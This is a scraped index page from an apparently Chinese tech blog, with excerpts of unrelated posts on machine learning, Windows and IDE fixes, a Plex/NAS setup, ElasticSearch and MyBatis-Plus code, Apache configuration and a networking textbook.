		 决策树 C4.5 公式流程 注意! 这里由2种成分组成：属性（年龄、有工作、有自己的房子、信贷情况）和类别组成。
那么：
决策类别的信息熵： I n f o ( D ) = ∑ − 每 个 类 别 总 占 比 ∗ ( l o g 2 每 个 类 别 总 占 比 ) Info(D)=\sum - 每个类别总占比 * (log_2每个类别总占比) Info(D)=∑−每个类别总占比∗(log2​每个类别总占比) 例如： Info(类别)= -6/15x(log26/15) - 9/15x(log29/15)每个属性的信息熵： I n f o ( a t t r ) = ∑ a t t r 属 性 每 个 分 类 总 占 比 ∗ [ − a t t r 属 性 每 个 分 类 中 每 个 类 别 的 占 比 ] Info(attr) =\sum attr属性每个分类总占比 * [- attr属性每个分类中 每个类别的占比 ] Info(attr)=∑attr属性每个分类总占比∗[−attr属性每个分类中每个类别的占比] 例如：Info(年龄)= 5/15 x (-3/5log23/5 - 2/5log22/5) + 5/15 x (-2/5log22/5 -3/5log23/5) + 5/15 x (-1/5log21/5 - 4/5log24/5)信息增益：Gain(attr) = Info(D)-Info(attr) 例如：Info(类别)-Info(年龄)内在信息（惩罚）: H ( a t t r ) = ∑ − a t t r 每 个 分 类 总 占 比 ∗ l o g 2 a t t r 每 个 分 类 总 占 比 H(attr)=\sum - attr每个分类总占比 * log_2attr每个分类总占比 H(attr)=∑−attr每个分类总占比∗log2​attr每个分类总占比 例如H(年龄) = -5/15 x log25/15 - 5/15 x log25/15 -5/15 x log25/15信息增益率： IGR(attr) = Gain(attr) / H(attr) 例如：IGR(年龄)=Gain(年龄)/H(年龄) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fee841959d91ad0694a5aca49918c76/" rel="bookmark">
			计算机切换用户打不开,win10系统无法切换账户且应用打不开的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多小伙伴都遇到过win10系统无法切换账户且应用打不开的困惑吧，一些朋友看过网上零散的win10系统无法切换账户且应用打不开的处理方法，并没有完完全全明白win10系统无法切换账户且应用打不开是如何解决的，今天小编准备了简单的解决办法，只需要按照　1、按WIN+R 调出运行，然后输入gpedit.msc 回车; 2、打开策略组之后，在右侧选项列表中，展开【计算机配置】—【Windows设置】—【安全设置】—【本地策略】—【安全选项】;的顺序即可轻松解决，具体的win10系统无法切换账户且应用打不开教程就在下文，一起来看看吧！
原因分析：
原因是由于原来的Win7系统使用了Adminitrator内置管理员帐户来管理操作系统，而在我们升级到Win10之后沿用了之前的帐户登录，可 是不巧在win10中使用内置管理员帐户有很多问题，导致用户无法打开应用，设置等(win10系统的设置已经Metro化了)。
解决方法：
一、首先我们先要让Administrator帐户能打开“设置”“帐户”等应用;
1、按WIN+R 调出运行，然后输入gpedit.msc 回车;
2、打开策略组之后，在右侧选项列表中，展开【计算机配置】—【Windows设置】—【安全设置】—【本地策略】—【安全选项】;
3、双击打开“用户帐户控制：本地账户的管理员批准模式”然后设置为“已启用”并保存;
4、然后尝试是否能打开，不行的话重启一下计算机。
二、使用别的帐户登录或新建一个管理员帐户;
可以使用Administrator打开帐户管理后，我们再到帐户——其他帐户中新建一个管理员帐户并使用他登录即可。
PS：win10系统和win8系统有点相似，Administrator帐户的权限并没有Win7系统中大，所以大家还是尽量使用别的管理员帐户登录。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16dce9691378dd9d336e54f5b7947ca8/" rel="bookmark">
			【群晖NAS】搭建Plex保姆级教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、安装步骤
设备
服务端配置
1.安装套件
2.注册Plex账号
3.添加资料库
4.内网穿透
二、客户端
总结
前言 Plex是NAS家庭影院一个很棒的方案，如果你的NAS上有许多不错的影视资源，想要通过投影仪、平板、电脑、手机等客户端来观看，并且如果你希望可以有序管理日益增多的影视资源，有一个简洁明了、容易上手的操作界面，那么Plex一定是一个不错的选择！
一、安装步骤 设备 群晖DS918+ NAS
服务端配置 作为一整套的流媒体解决方案，Plex同时拥有服务端和客户端，在搭建完服务端后，可通过不同终端类型的客户端来访问服务端的资源。
1.安装套件 打开群晖套件中心——所有套件，搜索Plex Media Server
安装完成后，点击打开，或者访问NAS地址的32400端口，即可进入Plex的服务端管理页面。
2.注册Plex账号 在登陆这个账号后，Plex会自动把你当前安装的这个服务端与你的NAS进行绑定，如果通过手机等客户端登陆App时，会在局域网或者根据NAS的公网IP（如果有的话）自动搜索服务端。
3.添加资料库 这个可根据个人需要来添加，基本上一个电影库，一个电视剧的库就够了。
选择类型
选择资源文件夹
3.自动刮削
设置好资料库后，Plex会自动扫描资料库中的文件，然后刮削影片信息，也就是去网上寻找与该资源相关的介绍、海报等。但是Plex默认的刮削设置并不是很好用，我们需要重新设置一下。
点击右上角设置——常规——语言——中文
然后点击代理——电影（或电视节目）——The Movie Database,将该选项拖至最顶端
回到主界面，点击电影——管理资料库——编辑
高级——代理——The Movie Database
设置完成后，就可以实现自动刮削啦。
以下为效果图：
4.内网穿透 如果你的NAS使用了内网穿透的服务的话，在可以在Plex中配置来实现自动搜索服务端。
具体实现请参考：https://blog.csdn.net/weixin_40444691/article/details/117285365
二、客户端 Plex支持全平台的客户端。
网页端 网页端的话访问 http(s)://【NAS的IP地址】: 【32400】即可。
IOS，安卓 App 总结 Plex我认为比其他流媒体方案的优势在于易用性更高一些，我本人是使用内网穿透NAS的，穿透节点有时需要更换，所以Plex的配置更友好一些，不需要客户端做更改，只需修改服务端即可。
购买会员后可以享受硬件加速还有其他服务。
制作不易，觉得有用的朋友麻烦点个赞🙏🙏🙏
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38d0a52ded4c0c88c0a8432544c915da/" rel="bookmark">
			正逆运动学&#43;动力学仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​【前言】最近看到一些留言在寻找源码，现整理了全部分享出来，其中包括正逆运动学解算、雅克比矩阵应用（主要用于关节力矩的计算），需要的小伙伴自取。
一、平面二连杆运动学建模
二、平面二连杆动力学建模
应用背景：使用拉格朗日法建立二连杆动力学模型
subplot(221):仿真运动图像
subplot(222):动能和势能，动能和势能相加为定值，说明动能和势能发生转化，总的能量不变；
subplot(223):两个关节的运动角度
subplot(224):两个关节角速度变化
三、空间二连杆动力学建模
四、二连杆力矩控制（雅克比矩阵应用）
应用背景：末端达到指定位置（下图为第一个关节180°，第二个关节90°）
图像说明
subplot(221):仿真运动图像
subplot(222):动能和势能
subplot(223):两个关节的运动角度（可见超调后到达指定关节角度）
subplot(224):两个关节角速度变化
添加公众号获取源码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a51df085db1b0668768a60c7595ecb6d/" rel="bookmark">
			行人重识别论文阅读2-视频中基于时空相关性和拓扑学习的行人重识别（CTL）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		视频中基于时空相关性和拓扑学习的行人重识别 Spatial-Temporal Correlation and Topology Learning for Person Re-Identification in Videos
论文地址：Paper
解决的问题： 本文提出一个新的时空相关性和拓扑学习框架(CTL)，通过建立跨尺度的时空相关性来追求有区别的和鲁棒的表示。
利用一个CNN主干和一个关键点估计其从人体中提取多个粒度的语义局部特征作为图节点。通过考虑全局上下文信息和人体的物理联系，探索了一种上下文增强拓扑来构造多尺度图。设计三维图形卷积和跨尺度图形卷积，有助于跨时空和跨尺度信息的直接传播，以捕获分层的时空相关性和结构信息。通过执行这两个卷积，CTL有效挖掘与外观信息互补的综合线索，以增强表示能力。 本文的创新点： 提出一个时间-空间相关联的拓扑式学习框架学习上下文增强的拓扑结构构造多尺度图，同时考虑从人体全局上下文信息和物理连接提出3D图卷积和跨尺度图形卷积模拟高阶时空依赖性和拓扑信息 细小的知识点： 行人重识别分类：
基于图像的方法：利用没有时间信息的静态图像来检索行人。
基于视频的方法：包含一段时间丰富的时空信息。可为解决这些问题提供清晰而丰富的线索。
针对遮挡问题，有文献采用姿态估计模型自适应定位行人关键点，以提取对准的行人特征，但是剧烈的视点和姿态变化以及视频中的遮挡会影响姿态估计的准确性。
本文提出一种时空相关、拓扑学习框架基于视频的行人重识别方法，有区分性和强代表性。CTL从多粒度级别提取特征，为了捕获不同的有区别的语义和不稳定的估计框架学习身体部位间的潜在跨尺度空间时间依赖性和结构信息，它可以增强特征表示，CTL使用CNN作为主干，用关键的点估计从人体中提取语义特征，将三个关键节点作为图节点，提出具有拓扑结构的上下文骨架来建立多层次图。通过考虑人体的全局背景信息和物理信息有效地模拟节点之间固有的时空关系。
使用3D图形卷积核跨尺度图形卷积有利于跨时空和跨尺度信息传播，以适应更高层的时空相关性和结构信息，通过联合执行不同的卷积，CTL可以有效地发现和总和有区别的线索，这些线索不完整且没有外观信息。
基于图片的ReID：设计有区别的手工标注的标签，距离度量学习，深度学习技术。
部分遮挡问题，不准确的检测，姿态变化的鲁棒估计：刚性条纹分割，注意机制
图通常用于建模节点之间的关系。
算法概述： 模型的组成：关键点估计器的主干网络，上下文块，多级别3D图形卷积层（3D-GCL），多级别跨尺度图形卷积层（CS-GCL），融合块。
实验结果： 数据集和评估标准 数据集：MARS，iLIDS-VID
评估标准：CMC，mAP
训练策略：从长度可变的序列随机抽取6帧作为输入，每一个小batch有8个特征和4个视频剪辑，视频帧大小256*128，然后对数据进行增强。主干ResNet50在ImageNet上预训练，ResNet50最后一个stride设置为1，Adam优化器，初始lr为0.0003，权重衰减0.0005，总共240个epoch，后60个epoch的lr减小10倍。
实验结果 在MARS数据集上的比较
在iLIDS-VID数据集上的结果比较
消融研究 各部分之间的相互依存性
第一行是使用具有关键点估计器的主干网络来学习全局和多尺度部分特征。
第二行使用上下文增强拓扑来构造多尺度逐帧图，并使用原始GCN学习细化多尺度局部特征和全局特征。
第三行CTL用加法运算代替CS-GCL学习融合后的零件特征和局部特征
第四行是CTL的整个学习框架。
上下文增强拓扑捕捉身体部位之间的内在关系以增强特征表示的有效性。CS-GCL有效地捕捉了跨多个尺度的不同视觉语义，并将它们整合到一个综合的表示中。 上下文增强拓扑
A s m \mathbf A^m_s Asm​简单的提高了图拓扑的灵活性，并且捕获了更复杂的时空相关性。
A s c \mathbf A^c_s Asc​是物理拓扑的补充，并通过考虑所有节点的全局上下文信息来挖掘潜在的信息连接。
3D-GCL
一层的3D-GCL不足以捕捉复杂的时空信息，三层的3D-GCL会带来更多的训练参数，导致难以优化并且性能下降。
b图中3比1获得更好的性能，利用来自局部时间邻域节点的时间互补信息，为5时，由于过大的局部时间邻域节点抵消了聚集特征中的区别线索，模型性能减小。
CS-GCL
两层CS-GCL比一层的CS-GCL性能下降，因为两层倾向于融合大量冗余信息，削弱了表征能力。第五行通过结合更多细粒度级零件特征比其他两行获得更好的效果。
CS-GCL能够有效地从每个尺度上挖掘出不同的模式，并通过融合它们之间的互补信息来增强特征表示。
可视化结果
a）来自行人的不同视频帧的特征图在相同的辨别区域上具有更强的响应，这验证了CTL可以通过建模跨尺度时空相关性来提取对齐的辨别线索。
b）CTL的排名5的检索结果都是匹配的。这表明CTL有效地缓解了未对准和遮挡、视点变化等问题。
算法详述： 多尺度特征提取： 视频序列 { I t } t = 1 T \{I_t\}^T_{t=1} {It​}t=1T​,T是序列长度。 每一帧的特征 F = { F t ∣ F t ∈ R H × W × C } t = 1 T F = \{F_t | F_t \in R^{H \times W \times C}\}^T_{t=1} F={Ft​∣Ft​∈RH×W×C}t=1T​，主干网络为ResNet50。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a51df085db1b0668768a60c7595ecb6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e558819089e33eecd3565c5b94377ffc/" rel="bookmark">
			XGBoost梯度提升方法实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		XGBoost梯度提升方法 实验环境为google colab
XGBoost参数 这里可以参考博客如下：
作者：大石头的笔记
链接：https://juejin.cn/post/6844904134336839693
来源：掘金
XGBoost的参数可以分为三种类型：通用参数、booster参数以及学习目标参数
General parameters：参数控制在提升（boosting）过程中使用哪种booster，常用的booster有树模型（tree）和线性模型（linear model）。Booster parameters：这取决于使用哪种booster。Learning Task parameters：控制学习的场景，例如在回归问题中会使用不同的参数控制排序。除了以上参数还可能有其它参数，在命令行中使用 import pandas as pd import numpy as np df = pd.read_csv('/content/drive/MyDrive/NOx/dataset/NOx_df.csv') df Unnamed: 0tmainsteamfuelo2primaryfanfanAcoalBcoalCcoalDcoalbrunoutNOx1NOx2000.0000000.0396180.1621460.6552390.1320230.0612730.6587950.4187020.4409410.0000620.10.4351720.405764110.0000010.0396140.1621720.6539350.1295840.0605100.6543080.4151850.4402870.0000620.10.4351720.405764220.0000020.0396100.1621990.6526310.1271460.0597480.6498220.4116670.4396330.0000620.10.4351720.405764330.0000030.0396060.1622260.6513280.1346340.0589850.6453360.4117900.4400690.0000620.10.4351720.405764440.0000050.0396020.1622520.6500240.1421220.0582220.6408500.4119130.4405050.0000620.10.4351720.405764.............................................8639958639950.9999950.3424070.3364400.5235090.1683940.0852920.2851600.3968350.4216430.3695581.00.5293680.5870318639968639960.9999970.3432970.3372150.5227510.1583690.0839100.2724710.3966280.4211260.3687941.00.5295740.5880708639978639970.9999980.3441880.3379890.5219940.1483440.0825270.2597810.3964200.4206090.3680301.00.5304180.5887858639988639980.9999990.3450790.3387630.5212360.1310150.0841450.2689460.3953240.4224630.3684121.00.5312620.5895008639998639991.0000000.3459690.3395380.5204780.1136850.0857630.2781110.3942290.4243170.3687941.00.5321050.590214 864000 rows × 14 columns
读取数据 X = df[["t",'mainsteam','fuel','o2','primaryfan','fan','Acoal','Bcoal','Ccoal','Dcoal','brunout']].values y = df[['NOx1']].values X.shape, y.shape ((864000, 11), (864000, 1)) 切分训练集和测试集 from sklearn.model_selection import train_test_split # 划分数据集，70% 训练数据和 30% 测试数据 X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3) X_train.shape, X_test.shape, y_train.shape, y_test.shape ((604800, 11), (259200, 11), (604800, 1), (259200, 1)) XGBoost梯度提升回归方法 import xgboost as xgb model_r = xgb.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e558819089e33eecd3565c5b94377ffc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb0a1fec0912fef0a7bb26948791434f/" rel="bookmark">
			计算机主机主板电池,主板电池没电,教您电脑主板电池没电怎么办
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		主板是电脑的主要组成部分，是一个非常重要的零件。主板的好坏决定了电脑能不能正常的运行。那么当电脑的主板电池没电的时候会怎么办？电脑的主板电池没电的时候，电脑就会不能正常的使用，甚至会陷入崩溃的状态。下面，小编给大家分享电脑主板电池没电的处理经验。
电脑的用户就知道，主板的故障千奇百怪，这不，有相当多莫名其妙的故障情况是因为主板电池引起的。主板电池没电了会导致主板coms设置保存不了，那电脑主板电池没电怎么办？下面，小编给大家介绍电脑主板电池没电的解决步骤。
电脑主板电池没电怎么办
检查电脑的电源风扇是否会转动起来，硬盘是否有自检声，显示器是否变亮，如果这时候电脑显示“CMOS Load Failure”。
主板电池电脑图解1
系统提示按“F2”键继续启动，不管它，按“Del”进入BIOS设置。
电池没电电脑图解2
按下F2键，让系统继续引导，如果还是无法进入Windows XP的桌面，再次重启。
主板电池电脑图解3
“Del”键进入BIOS设置，这时不需要输入密码，可以直接进入了，很显然CMOS电池没电了。
主板电脑图解4
需要买了一块新的电池装进其中，并接上所有设备再次开机，电脑即可顺利启动。
以上就是电脑主板电池没电的处理经验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf2feddd8848ca33b65cf92e5111d074/" rel="bookmark">
			ElasticSearch 7.13.1 java中的增删改查
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：
现在大部分博客或者csdn都是老版本的其中很多特性都收到改变，通过一下午的spring官网的钻研，终于通关了es7.13.1的代码实现，闲话不多说
pom文件 &lt;dependency&gt; &lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt; &lt;artifactId&gt;elasticsearch-rest-high-level-client&lt;/artifactId&gt; &lt;version&gt;7.13.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.elasticsearch&lt;/groupId&gt; &lt;artifactId&gt;elasticsearch&lt;/artifactId&gt; &lt;version&gt;7.13.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt; &lt;artifactId&gt;elasticsearch-rest-client&lt;/artifactId&gt; &lt;version&gt;7.13.1&lt;/version&gt; &lt;/dependency&gt; config类 import org.apache.http.HttpHost; import org.elasticsearch.client.RequestOptions; import org.elasticsearch.client.RestClient; import org.elasticsearch.client.RestHighLevelClient; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; @Configuration public class GulimallEsSearchConfig { public static final RequestOptions COMMON_OPTIONS; static { RequestOptions.Builder builder = RequestOptions.DEFAULT.toBuilder(); COMMON_OPTIONS = builder.build(); } /** * 方式一：无账号密码连接方式 * new HttpHost("localhost", 9200, "http"))); * //集群配置法 * new HttpHost("localhost", 9201, "http"))); **/ @Bean public static RestHighLevelClient esRestClient() { RestHighLevelClient client = new RestHighLevelClient( RestClient.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf2feddd8848ca33b65cf92e5111d074/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/396acb9206254efe8f27fe1e1f706327/" rel="bookmark">
			idea_去掉double shift打开搜索框
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		① 打开idea，使用快捷键，CTRL+shift+a，搜索，registry
② 找到ide.suppress.double.click.handler 打上勾，close，然后，就可以了
③ 什么，？？？没有ide.suppress.double.click.handler ？？？，山人也有妙计：
关闭idea------&gt;找到idea的安装目录，找到lib目录下的resources.jar，使用压缩工具打开，（推荐Bandzip，好用还免费）-----&gt;然后打开其中的idea目录下的PlatformActions.xml，然后编辑，------&gt;找到com.intellij.ide.actions.SearchEverywhereAction，具体是：
&lt;action id="SearchEverywhere" class="com.intellij.ide.actions.SearchEverywhereAction" icon="AllIcons.Actions.Find"/&gt; 然后，注释掉这一个action标签。然后保存退出，-----&gt;打开idea-----&gt;搞定
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25a15ed5c67f03e8f79ac7094f5156bc/" rel="bookmark">
			java四舍五入方法表达式，吐血整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL 数据库最佳学习线路脑图： 一、 对MySQL 的认识 认识Mysql数据库
下载安装MySQL软件
在Linux系统环境下安装MySQL
MySOL体系结构与存储引擎
MySQL体系结构 Query Cache 详解存储引擎InnoDB体系结构InnoDB的三大特性. 数据库文件
参数文件参数类型错误日志文件(error log)二进制日志文件(binary log)慢查询日志(slow log)全量日志(general log)审计日志(audit log)中继日志(relay log)Socket文件表结构文件 表
整型浮点型时间类型字符串类型字符集表碎片产生的原因碎片计算方法及整理过程表统计信息统计信息的收集方法MySQL库表常用命令总结 索引
二叉树结构.平衡二叉树结构B-tree 结构B+tree哈希索引索引的总结 事务
事务的特性事务语句truncate和delete的区另事务的隔离级别细说脏读、不可重复读、幻读.可重复读现象. 锁
InnoDB的锁类型InnoDB行锁种类锁等待和死锁锁问题的监控 备份恢复
MySQL的备份方式冷备及恢复热备及恢复流式化备份表空间传输利用binlog2sql进行闪回binlog server 主从复制概论
常见的几种主从架构模式图主从复制功能主从复制原理复制中的重点参数详解 复制原理及实战演练
异步复制主从复制故障处理.11.3半同步复制半同步复制和异步复制模式的切换GTID复制多源复制主从延迟的解决方案及并行复制主从复制的数据校验. MHA
keepalived+双主架构
Keepalived介绍集群搭建思路及建议实验部署演练 PXC
PXC原理PXC架构的优缺点PXC中重要概念和重点参数PXC架构搭建实战PXC集群状态的监控从节点在线转化为PXC节点 proxySQL
ProxySQL的安装与启动配置ProxySQL监控ProxySQL的多层配置系统配置ProxySQL主从分组信息配置读写分离策略测试读写分离 MLSQL全面优化
硬件优化配置参数优化从Linux操作系统层面来谈对MySQL的优化表设计及其他优化整体管理优化总结 MLSQL面试宝典
自我介绍技术问答 说到MLSQL的面试题，就有一些问题想考考各位了！请听题：
1、一张表，里面有 ID 自增主键，当 insert 了 17 条记录之后，删除了第 15,16,17 条记录，
再把 Mysql 重启，再 insert 一条记录，这条记录的 ID 是 18 还是 15 ？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25a15ed5c67f03e8f79ac7094f5156bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d596fc477029063aa311ef5a18f4023/" rel="bookmark">
			精品丨分页报表—自助化分析与格式化数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PowerBI的前身是Excel，但是有很多Excel的功能PowerBI并没有完全涵盖，这就导致了有些Excel能做到的，PBI反而做不了。
比如：合并单元格的格式化数据表格。
要知道，Excel在国内亦或者世界的市场上已经沉浸了很多年了，相较于各类BI软件而言，Excel仍旧处于统治地位。
白茶在做项目的时候，经常有一些需求，想使用合并单元格等特定格式的表格。但是PBI原生的表格类型只有Table和矩阵两种类型，无法满足自定义格式，这个问题相信很多小伙伴都深有体会。
PowerBIDesktop2021.June更新
微软于2021年6月25日更新了PBI的版本，新增了一个预览功能。
可以看到，微软将分页报表内嵌到了可视化面板中，虽然此功能仍处于预览状态，但是已经不影响正常使用。
示例：效果图介绍
先看看下面的效果图，白茶再继续说。
合并单元格
首先是分页报表可以完美的在PowerBI中展示，细心的小伙伴可以看到，在[商品名称]和[年度]这两个项目出现了PBI原本做不到的合并单元格效果。
参数筛选
这里有参数筛选的选项，而且可以与BI的其他可视化进行联动。
数据导出
在左上角的导出按钮，可以导出多种文件格式。
如上图，展示的是使用Excel模板导出的数据样式。
怎么样，是不是效果还可以？
分页报表介绍
分页报表的全称是PowerBI Report Builder。
它的前身就是我们经常说的SSRS，也就是传统微软三件套中的报表制作工具。
随着PowerBI的展开，越来越多的用户需求Bowler格式化数据，微软将SSRS中的报表制作工具单独抽取出来，也就是我们本期所说的分页报表。
Power BI Report Builder相较于它的前身，它更像是为了云上服务而产生的。
它可以连接本地的数据源，也可以直接连接云上的数据集。
功能：
主界面与SSRS的报表制作界面完全一致，白茶这里就不赘述了。
那么我们如何通过分页报表制作一张自定义格式的报表呢?
分页报表制作
首先，连接数据源，这里白茶选择连接云上的数据集。
在添加PowerBI数据界面，可以看到白茶云上的数据集，选择分页报表Demo。
数据源已经添加完毕，添加数据集。
在下图的位置，选择我们刚才添加的数据源。
在查询设计界面，我们就可以设计数据集了。
在下方界面，我们可以看到三个板块。
将我们需要的字段分别拖到参数界面和查询界面。
点击OK。
接下来，我们添加一个矩阵，将字段添加。
结果如下：
我们可以选择左上角的Run，也可以选择直接发布，这里白茶选择直接发布。
我们在云上查看一下效果。
这个是云上的效果。因为时间关系，这个例子有点粗糙，后续感兴趣的小伙伴可以自己动手尝试一下。
嵌入PowerBI
在可视化操作面板，我们点击分页报表可视化。
选择连接报表。
选择我们刚才制作的test报表。
配置参数，选择查看报表。
如下图：
这样就实现了分页报表与PBI的连通。
注意事项：
1.分页报表在PBI中呈现只是嵌入，不能进行编辑
2.分页报表需要在Report Builder中开发
3.云上服务使用分页报表需要Premium工作区
小伙伴们❤GET了么？
白茶会不定期的分享一些函数卡片
（文件在知识星球[PowerBI丨需求圈]）
这里是白茶，一个PowerBI的初学者。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55021a2474da6bdd523abe7c8a9fd127/" rel="bookmark">
			Apache阶段二-
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Apache 主要配置文件注释
Apache的主配置文件：/etc/httpd/conf/httpd.conf
默认站点主目录：/var/www/html/
Apache服务器的配置信息全部存储在主配置文件/etc/httpd/conf/httpd.conf中，这个文件中的内容非常多，用wc命令统计一共有1009行，其中大部分是以#开头的注释行。
ServerTokens OS
在出现错误页的时候是否显示服务器操作系统的名称，ServerTokens Prod为不显示
ServerRoot "/etc/httpd"
用于指定Apache的运行目录，服务启动之后自动将目录改变为当前目录，在后面使用到的所有相对路径都是想对这个目录下
User daemon # apache的用户，默认为daemon Group daemon # apache的用户，默认为daemon PidFile run/httpd.pid
记录httpd守护进程的pid号码，这是系统识别一个进程的方法，系统中httpd进程可以有多个，但这个PID对应的进程是其他的父进程
Timeout 60
服务器与客户端断开的时间
KeepAlive Off
是否持续连接（因为每次连接都得三次握手，如果是访问量不大，建议打开此项，如果网站访问量比较大关闭此项比较好），修改为：KeepAlive On 表示允许程序性联机
MaxKeepAliveRequests 100
表示一个连接的最大请求数
KeepAliveTimeout 15
断开连接前的时间
&lt;IfModule prefork.c&gt; StartServers 8 MinSpareServers 5 MaxSpareServers 20 ServerLimit 256 MaxClients 256 MaxRequestsPerChild 4000 &lt;/IfModule&gt; 系统默认的模块，表示为每个访问启动一个进程（即当有多个连接公用一个进程的时候，在同一时刻只能有一个获得服务）。
StartServer开始服务时启动8个进程，最小空闲5个进程，最多空闲20个进程。
MaxClient限制同一时刻客户端的最大连接请求数量超过的要进入等候队列。
MaxRequestsPerChild每个进程生存期内允许服务的最大请求数量，0表示永不结束
&lt;IfModule worker.c&gt; StartServers 4 MaxClients 300 MinSpareThreads 25 MaxSpareThreads 75 ThreadsPerChild 25 MaxRequestsPerChild 0 &lt;/IfModule&gt; 为Apache配置线程访问，即每对WEB服务访问启动一个线程，这样对内存占用率比较小。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55021a2474da6bdd523abe7c8a9fd127/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/989cd51c683ebac184882785019781dc/" rel="bookmark">
			LambdaQueryWrapper、LambdaUpdateWrapper、LambdaQueryChainWrapper的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用MyBatis-Plus的时候，之前不知道有LambdaQueryWrapper这东西，使用的是QueryWrapper，这样就导致了一个问题，在代码里写入了数据库的列名，这样属于硬编码的方式，而且entity里已经定义了列名和属性名的对应关系，于是感到很不舒服，不可能这么好用的Mybatis Plus，还存在这么明显的不人性化的东西。经过一番百度、查看官方文档之后，得知了LambdaQueryWrapper的存在，解决了硬编码的问题。
举例：
SpuInfoEntity.java 商品spu信息
@Data @TableName("pms_spu_info") public class SpuInfoEntity implements Serializable { private static final long serialVersionUID = 1L; /** * 商品id */ @TableId private Long id; /** * 商品名称 */ private String spuName; /** * 商品描述 */ private String spuDescription; /** * 所属分类id */ private Long catalogId; /** * 品牌id */ private Long brandId; /** * */ private BigDecimal weight; /** * 上架状态[0 - 下架，1 - 上架] */ private Integer publishStatus; /** * */ private Date createTime; /** * */ private Date updateTime; } 使用QueryWrapper的方式：里面存在数据库列名，如spu_name
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/989cd51c683ebac184882785019781dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5967e31ade1c47213e4605a8fa772481/" rel="bookmark">
			IntelliJ IDEA-【2】使用小技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、取消两次shift弹页
【1】按ctrl+shift+a，弹出如搜索框。
【2】输入registry，然后回车。
【3】找到“ide.suppress.double.click.handler”，将后面的复选框勾上。
【4】勾选上复选框后直接点击close，然后双击shift的时候就不会再出现全局搜索框。
2、控制台打印不同颜色的字体
System.out.println("33[43;34;4m"+"请输入你要合成的文本并回车"+"33[0m"); System.out.println("33[43;31;4m"+"结束合成:输入n,继续合成:输入其他内容"+"33[0m"); 3、执行Jar包指定UTF-8
java -Dfile.encoding=UTF-8 -jar XXXXX.jar 4、设置字体
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cf1118114cd129e1d280102bbd111db/" rel="bookmark">
			计算机及网络技术基础,计算机及网络技术基础.pdf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		电子发烧友 电子技术论坛
础 基 术 技 络 网 机 算 计 校 学 科 专 等 高 范 师 阳 郧 北 湖 洲 统 何
电子发烧友
电子技术论坛 1
电子发烧友 电子技术论坛
第一部分计算机网络基础
第一部分计算机网络基础
第一章计算机网络与数据通信基础
第一章计算机网络与数据通信基础
电子发烧友
电子技术论坛 2
电子发烧友 电子技术论坛
本章主要内容
本章主要内容
了解计算机网络的形成与发展过程
了解计算机网络的形成与发展过程
掌握计算机网络的定义、分类、功
掌握计算机网络的定义、分类、功
能和典型应用
能和典型应用
掌握计算机网络的组成结构
掌握计算机网络的组成结构
了解计算机网络的基本拓扑结构
了解计算机网络的基本拓扑结构
了解数据通信的传输方式、交换技术、同
了解数据通信的传输方式、交换技术、同
步技术、差错控制技术等基础知识
步技术、差错控制技术等基础知识
掌握数据传输的类型及相应的编码方法
掌握数据传输的类型及相应的编码方法
了解多路复用技术的分类和适用场合
